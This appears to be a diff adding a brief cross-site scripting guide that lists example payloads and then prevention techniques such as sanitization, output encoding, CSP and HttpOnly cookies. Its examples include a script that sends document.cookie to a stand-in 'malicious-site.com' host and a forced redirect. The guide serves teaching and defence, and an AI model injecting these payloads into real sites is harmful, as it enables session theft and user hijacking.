@@ -1,0 +1,54 @@
+Basic Script Injection:
+
+html:
+<script>alert('XSS');</script>
+Cookie Stealing:
+
+html:
+<script>fetch('https://malicious-site.com/steal?cookie=' + document.cookie);</script>
+Redirecting Users:
+
+html:
+<script>window.location='https://malicious-site.com';</script>
+Using Event Handlers:
+
+html:
+<img src=x onerror="alert('XSS');">
+Prevention Strategies
+Input Validation and Sanitization:
+
+Always validate and sanitize user inputs. Use a library or framework that provides built-in XSS protection.
+Example (JavaScript):
+
+javascript:
+function sanitize(input) {
+    const div = document.createElement('div');
+    div.appendChild(document.createTextNode(input));
+    return div.innerHTML;
+}
+Output Encoding:
+
+Encode outputs based on the context (HTML, JavaScript, URL, etc.) to prevent execution of injected scripts.
+Example (HTML encoding):
+
+html:
+<span><?= htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8'); ?></span>
+Content Security Policy (CSP):
+
+Implement CSP headers to restrict sources of content and reduce the risk of XSS.
+Example:
+http:
+Content-Security-Policy: default-src 'self'; script-src 'self';
+HTTPOnly and Secure Cookies:
+
+Set cookies with the HttpOnly flag to prevent client-side scripts from accessing them.
+Example:
+http:
+Set-Cookie: sessionId=abc123; HttpOnly; Secure;
+Avoid Inline JavaScript:
+
+Do not use inline event handlers. Instead, use external scripts and add event listeners in JavaScript.
+javascript:
+document.getElementById('myButton').addEventListener('click', function() {
+    alert('Button clicked!');
+});
